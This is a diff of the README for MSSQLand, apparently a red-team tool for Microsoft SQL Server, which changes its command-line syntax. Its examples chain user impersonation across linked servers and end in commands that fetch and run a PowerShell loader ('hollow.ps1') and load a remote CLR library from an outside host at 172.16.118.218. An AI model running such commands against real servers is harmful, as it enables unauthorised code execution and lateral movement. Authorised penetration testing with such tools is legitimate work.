@@ -16,6 +16,10 @@ MSSQLand is built for interacting with [Microsoft SQL Server](https://en.wikiped
 
 ## 🚀 Quick Start
 
+```shell
+MSSQLand.exe <host> [options] <action> [action-options]
+```
+
 Format: `server,port:user@database` or any combination `server:user@database,port`.
 - `server` (required) - The SQL Server hostname or IP
 - `,port` (optional) - Port number (default: 1433, also common: 1434, 14333, 2433)
@@ -23,52 +27,52 @@ Format: `server,port:user@database` or any combination `server:user@database,por
 - `@database` (optional) - Database context (defaults to 'master' if not specified)
 
 ```shell
-MSSQLand.exe /h:localhost /c:token /a:info
-MSSQLand.exe /h:localhost,1434 /c:token /a:info
+MSSQLand.exe localhost -c token info
+MSSQLand.exe localhost,1434@db03 -c token info
 ```
 
 > [!IMPORTANT]
-> The action argument `/a:` must be the **last global argument**. Everything after `/a:` is treated as action-specific arguments. For example: `/h:localhost /c:token /a:createuser /p:p@ssword!` - here `/p:` belongs to the action, not the global arguments.
+> The **host** (first argument) and **action** (after flags) are positional arguments. All flags use `-` prefix. For example: `localhost -c token createuser -p p@ssword!` - here `-p` belongs to the action, not the global arguments.
 
 **Common options:**
-- `/timeout:30` - Connection timeout in seconds (default: 15)
-- `/l:SERVER1:user1,SERVER2:user2` - Chain through linked servers (uses configured linked server names)
+- `--timeout 30` - Connection timeout in seconds (default: 15)
+- `-l SERVER1:user1,SERVER2:user2@dbclients` - Chain through linked servers (uses configured linked server names)
 
 > [!NOTE]
-> Port specification (`,port`) only applies to the initial `/h:` connection. Linked server chains (`/l:`) use the linked server names as configured in `sys.servers`, not hostname:port combinations.
+> Port specification (`,port`) only applies to the initial host connection. Linked server chains (`-l`) use the linked server names as configured in `sys.servers`, not `hostname:port` combinations.
 
 **Format examples:**
 ```shell
 # Simple: connect to SQL01 using master database
-/h:SQL01
+MSSQLand.exe SQL01 -c token info
 
 # Custom port: connect to SQL01 on port 1434
-/h:SQL01,1434
+MSSQLand.exe SQL01,1434 -c token info
 
 # Impersonate user: connect to SQL01, impersonate webapp01, use master database
-/h:SQL01:webapp01
+MSSQLand.exe SQL01:webapp01 -c token info
 
 # Port with impersonation: connect to SQL01:1434, impersonate webapp01
-/h:SQL01,1434:webapp01
+MSSQLand.exe SQL01,1434:webapp01 -c token info
 
 # Specify database: connect to SQL01, use myapp database (no impersonation)
-/h:SQL01@myapp
+MSSQLand.exe SQL01@myapp -c token info
 
 # Full format: connect to SQL01:1434, impersonate webapp01, use myapp database
-/h:SQL01,1434:webapp01@myapp
+MSSQLand.exe SQL01,1434:webapp01@myapp -c token info
 
 # Linked servers (using configured linked server names, not hostname:port)
-/l:SQL02:webapp02@appdb,SQL03:webapp03@analytics,SQL04@proddb
+MSSQLand.exe SQL01 -c token -l SQL02:webapp02@appdb,SQL03:webapp03@analytics,SQL04@proddb links
 
 # Mixed linked servers (some with database, some without)
-/l:SQL02:webapp02,SQL03:webapp03@mydb,SQL04@reporting
+MSSQLand.exe SQL01 -c token -l SQL02:webapp02,SQL03:webapp03@mydb,SQL04@reporting links
 ```
 
 ## 🫤 Help
 
-- `/help` - Show all available actions
-- `/help search_term` - Filter actions (e.g., `/help adsi` shows all ADSI-related actions)
-- `/a:createuser /help` - Show detailed help for a specific action
+- `-help` or `--help` - Show all available actions
+- `-help search_term` - Filter actions (e.g., `-help adsi` shows all ADSI-related actions)
+- `localhost -c token createuser --help` - Show detailed help for a specific action
 
 ## 📸 Clean Output for Clean Reports
 
@@ -79,7 +83,7 @@ All output tables are Markdown-friendly and can be copied and pasted directly in
 ![Searching pass](./media/example.png)
 
 > [!TIP]
-> You can also have `.csv` compatible output by using the `/o:csv` option: `/o:csv /a:procedures > procedures.csv`
+> You can also have `.csv` compatible output by using the `-o csv` option: `MSSQLand.exe localhost -c token -o csv procedures > procedures.csv`
 
 ## 👑 Show Time
 
@@ -104,7 +108,7 @@ EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04'
 No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
 
 ```shell
-.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04 links
 ```
 
 The output is as follows:
@@ -136,7 +140,7 @@ The output is as follows:
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04 impersonate
 ```
 The output shows:
 
@@ -170,12 +174,12 @@ The output shows:
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 Or even use Common Language Runtime (CLR) to load remotely a library with:
-```txt
-/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
+```shell
+.\MSSQLand.exe localhost:webapp02 -c token -l SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo clr "http://172.16.118.218/d/SqlLibrary.dll"
 ```
 
 ## 🤝 Contributing 
